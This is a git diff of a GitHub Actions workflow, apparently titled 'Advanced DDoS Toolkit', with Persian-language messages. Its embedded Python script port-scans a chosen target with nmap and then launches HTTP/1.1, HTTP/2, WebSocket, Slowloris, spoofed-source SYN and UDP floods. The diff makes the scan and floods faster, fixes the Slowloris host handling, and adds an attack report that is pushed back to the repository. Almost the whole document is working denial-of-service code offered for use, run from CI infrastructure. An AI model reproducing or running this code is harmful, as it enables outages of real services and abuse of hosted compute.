@@ -1,4 +1,4 @@
-name: Advanced DDoS Toolkit with Strong Bypass
+name: Advanced DDoS Toolkit with Report & Fast Scan
 
 on:
   workflow_dispatch:
@@ -52,7 +52,7 @@ jobs:
         run: |
           sudo apt-get update
           sudo apt-get install -y nmap
-          pip3 install aiohttp rich httpx websockets scapy python-nmap
+          pip3 install aiohttp rich "httpx[http2]" websockets scapy python-nmap
 
       - name: اجرای حمله
         env:
@@ -63,7 +63,7 @@ jobs:
           THREADS: ${{ github.event.inputs.threads }}
         run: |
           python3 << 'PYEOF'
-          import os, sys, time, socket, threading, random, nmap, asyncio, aiohttp, json, re
+          import os, sys, time, socket, threading, random, nmap, asyncio, aiohttp, json
           from datetime import datetime, timedelta
           from pathlib import Path
           from rich.console import Console
@@ -75,6 +75,7 @@ jobs:
 
           CACHE_DIR = Path("scan_results")
           CACHE_FILE = CACHE_DIR / "targets_cache.json"
+          REPORT_FILE = "attack_report.txt"
           CACHE_VALID_HOURS = 24
 
           # ===== کش =====
@@ -121,10 +122,11 @@ jobs:
               try: return socket.gethostbyname(target)
               except: return None
 
-          def scan_open_ports(ip, port_range='1-65535'):
-              console.print(f"[cyan]🔍 اسکن {ip}...[/cyan]")
+          # اسکن فوق سریع
+          def scan_open_ports(ip, port_range='1-10000'):
+              console.print(f"[cyan]🔍 اسکن سریع {ip}...[/cyan]")
               nm = nmap.PortScanner()
-              nm.scan(hosts=ip, arguments=f'-sT -sV -p {port_range} --min-rate 2000')
+              nm.scan(hosts=ip, arguments=f'-sT -sV -p {port_range} --min-rate 5000 --max-retries 1')
               open_ports = []
               if ip in nm.all_hosts():
                   for proto in nm[ip].all_protocols():
@@ -134,48 +136,35 @@ jobs:
                               open_ports.append({'port': port, 'service': service})
               return open_ports
 
-          # ===== لیست عظیم User-Agent =====
+          # ===== لیست User-Agent =====
           USER_AGENTS = [
-              # Chrome on Windows
               "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
               "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
               "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
               "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
-              # Chrome on Mac
               "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
               "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
               "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
-              # Chrome on Linux
               "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
               "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
               "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
-              # Firefox on Windows
               "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
               "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
               "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
-              # Firefox on Mac
               "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
               "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:119.0) Gecko/20100101 Firefox/119.0",
-              # Safari
               "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
               "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
-              # Edge
               "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
-              # Mobile
               "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
               "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36",
               "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
-              # Opera
               "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/105.0.0.0",
-              # Brave
               "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-              # Older browsers
               "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
               "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
-              # Bot/crawler (some services allow)
               "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
               "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
-              # Misc
               "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0",
               "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:78.0) Gecko/20100101 Firefox/78.0",
               "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
@@ -185,7 +174,7 @@ jobs:
           def get_random_ua():
               return random.choice(USER_AGENTS)
 
-          # ===== مسیرهای تصادفی برای دور زدن کش =====
+          # ===== مسیرهای تصادفی =====
           RANDOM_PATHS = [
               "/", "/index.html", "/home", "/about", "/contact", "/api/v1/status", "/api/v2/users",
               "/login", "/signup", "/search", "/products", "/categories", "/blog", "/news",
@@ -198,24 +187,7 @@ jobs:
           def get_random_path():
               return random.choice(RANDOM_PATHS)
 
-          # ===== پارامترهای تصادفی =====
-          def get_random_params():
-              params = {}
-              if random.random() > 0.5:
-                  params['q'] = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5, 15)))
-              if random.random() > 0.5:
-                  params['page'] = str(random.randint(1, 100))
-              if random.random() > 0.5:
-                  params['id'] = str(random.randint(1000, 99999))
-              if random.random() > 0.5:
-                  params['_'] = str(int(time.time() * 1000))
-              if random.random() > 0.5:
-                  params['token'] = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=32))
-              return params
-
           # ===== موتورهای حمله =====
-
-          # --- HTTP/1.1 Flood با تاخیر تصادفی ---
           async def http_worker_advanced(url, worker_id):
               async with aiohttp.ClientSession() as session:
                   while True:
@@ -229,18 +201,15 @@ jobs:
                           "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}",
                       }
                       path = get_random_path()
-                      params = get_random_params()
-                      full_url = url.rstrip('/') + path
                       try:
-                          async with session.get(full_url, headers=headers, params=params, timeout=8) as r:
+                          async with session.get(url.rstrip('/') + path, headers=headers, timeout=8) as r:
                               increment('sent')
                               if r.status < 500: increment('success')
                               else: increment('failed')
                       except:
                           increment('sent'); increment('failed')
-                      await asyncio.sleep(random.uniform(0.01, 0.05))  # تاخیر تصادفی کوچک
+                      await asyncio.sleep(random.uniform(0.005, 0.03))
 
-          # --- HTTP/2 Flood با payload سنگین ---
           async def http2_worker_advanced(url, worker_id):
               import httpx
               async with httpx.AsyncClient(http2=True, verify=False) as client:
@@ -248,60 +217,54 @@ jobs:
                       headers = {
                           "User-Agent": get_random_ua(),
                           "Content-Type": "application/x-www-form-urlencoded",
-                          "Accept": "*/*",
                       }
                       path = get_random_path()
-                      full_url = url.rstrip('/') + path
-                      payload = {'data': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(100, 1000)))}
                       try:
                           if random.random() > 0.5:
-                              r = await client.get(full_url, headers=headers, timeout=8)
+                              r = await client.get(url.rstrip('/') + path, headers=headers, timeout=8)
                           else:
-                              r = await client.post(full_url, headers=headers, data=payload, timeout=8)
+                              payload = {'data': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(100, 500)))}
+                              r = await client.post(url.rstrip('/') + path, headers=headers, data=payload, timeout=8)
                           increment('sent')
                           if r.status_code < 500: increment('success')
                           else: increment('failed')
                       except:
                           increment('sent'); increment('failed')
-                      await asyncio.sleep(random.uniform(0.001, 0.02))
+                      await asyncio.sleep(random.uniform(0.001, 0.01))
 
-          # --- Mixed Flood (ترکیب همه تکنیک‌ها) ---
           async def mixed_worker(url, worker_id):
-              """ترکیبی از HTTP/1.1, HTTP/2, WebSocket و درخواست‌های ناقص"""
               while True:
                   choice = random.randint(1, 10)
                   if choice <= 4:
-                      # HTTP/1.1 عادی
                       await http_worker_advanced(url, worker_id)
                   elif choice <= 7:
-                      # HTTP/2
                       await http2_worker_advanced(url, worker_id)
                   elif choice <= 9:
-                      # WebSocket
                       try:
                           import websockets
                           ws_url = url.replace('https://', 'wss://').replace('http://', 'ws://')
                           async with websockets.connect(ws_url + get_random_path()) as ws:
-                              await ws.send('X' * random.randint(1024, 8192))
+                              await ws.send('X' * random.randint(1024, 4096))
                               increment('sent'); increment('success')
                       except:
                           increment('sent'); increment('failed')
                       await asyncio.sleep(random.uniform(0.01, 0.1))
                   else:
-                      # Slowloris style - درخواست ناقص
                       try:
+                          parsed = url.replace('https://', '').replace('http://', '').split('/')[0]
+                          host = parsed.split(':')[0]
+                          port = 443 if 'https' in url else 80
                           sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                           sock.settimeout(5)
-                          sock.connect((url.split('/')[-1], 443 if 'https' in url else 80))
-                          sock.send(f"GET {get_random_path()} HTTP/1.1\r\nHost: {url.split('/')[-1]}\r\nUser-Agent: {get_random_ua()}\r\n".encode())
-                          sock.send("X-Header: ".encode() + b'X' * random.randint(100, 5000))
-                          time.sleep(random.uniform(5, 15))
+                          sock.connect((host, port))
+                          sock.send(f"GET {get_random_path()} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {get_random_ua()}\r\n".encode())
+                          sock.send(b"X-Header: " + b'X' * random.randint(100, 1000))
+                          time.sleep(random.uniform(5, 10))
                           sock.close()
                           increment('sent'); increment('success')
                       except:
                           increment('sent'); increment('failed')
 
-          # --- SYN Flood ---
           def syn_worker(ip, port):
               from scapy.all import IP, TCP, send
               while True:
@@ -309,9 +272,8 @@ jobs:
                   pkt = IP(src=src, dst=ip)/TCP(sport=random.randint(1024,65535), dport=port, flags="S")
                   send(pkt, verbose=False)
                   increment('sent'); increment('success')
-                  time.sleep(0.001)
+                  time.sleep(0.0005)
 
-          # --- UDP Flood ---
           def udp_worker(ip, port):
               sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
               while True:
@@ -320,9 +282,8 @@ jobs:
                       increment('sent'); increment('success')
                   except:
                       increment('sent'); increment('failed')
-                  time.sleep(0.001)
+                  time.sleep(0.0005)
 
-          # ===== اجراکننده‌ها =====
           def run_async_flood(worker_func, url, workers):
               loop = asyncio.new_event_loop()
               asyncio.set_event_loop(loop)
@@ -360,7 +321,6 @@ jobs:
               sys.exit(1)
           console.print(f"🎯 IP هدف: [bold cyan]{ip}[/bold cyan]")
 
-          # تشخیص پورت‌ها
           target_ports = None
           cached_ports = get_cached_scan(ip)
           if cached_ports is not None and PORT_ARG == 'auto':
@@ -388,12 +348,10 @@ jobs:
           console.print(f"⚡ نوع حمله: [bold magenta]{ATTACK}[/bold magenta]")
           console.print(f"⏱️ مدت: [bold]{DURATION}s[/bold] | 🧵 نخ: [bold]{THREADS}[/bold]\n")
 
-          # اجرای حمله
           for port in target_ports:
               scheme = "https" if port == 443 else "http"
               base_url = f"{scheme}://{TARGET}" if port in (80, 443) else f"{scheme}://{TARGET}:{port}"
               console.print(f"[bold green]🚀 شروع حمله روی {base_url}[/bold green]")
-
               if ATTACK == 'l7_mixed_flood':
                   for _ in range(THREADS):
                       t = threading.Thread(target=run_async_flood, args=(mixed_worker, base_url, 3))
@@ -424,12 +382,33 @@ jobs:
 
           final = get_stats()
           console.print("\n[bold green]✅ عملیات پایان یافت.[/bold green]")
+
+          # ===== ذخیره گزارش در فایل =====
+          success_rate = (final['success']/(final['sent'] or 1))*100
+          report_content = f"""📊 گزارش حمله DDoS
+========================
+🎯 هدف: {TARGET} (IP: {ip})
+🔌 پورت‌های هدف: {target_ports}
+⚡ نوع حمله: {ATTACK}
+⏱️ مدت زمان: {DURATION} ثانیه
+📤 کل بسته‌های ارسالی: {final['sent']:,}
+✅ موفق: {final['success']:,}
+❌ ناموفق: {final['failed']:,}
+🎯 نرخ موفقیت: {success_rate:.2f}%
+⚡ میانگین RPS: {final['rps']:.0f}
+🕒 زمان پایان: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+"""
+          with open(REPORT_FILE, 'w') as f:
+              f.write(report_content)
+          os.system(f"git add {REPORT_FILE} && git commit -m 'Add attack report' && git push 2>/dev/null || true")
+          console.print(f"[green]📄 گزارش حمله در {REPORT_FILE} ذخیره و به مخزن ارسال شد.[/green]")
+
           summary = Table(title="📊 گزارش نهایی", show_header=True)
           summary.add_column("متریک", style="cyan"); summary.add_column("مقدار", style="bold white")
           summary.add_row("کل ارسالی", f"{final['sent']:,}")
           summary.add_row("موفق", f"{final['success']:,}")
           summary.add_row("ناموفق", f"{final['failed']:,}")
-          summary.add_row("نرخ موفقیت", f"{(final['success']/(final['sent'] or 1))*100:.1f}%")
+          summary.add_row("نرخ موفقیت", f"{success_rate:.1f}%")
           summary.add_row("RPS میانگین", f"{final['rps']:.0f}")
           summary.add_row("زمان کل", f"{final['elapsed']:.1f}s")
           console.print(summary)
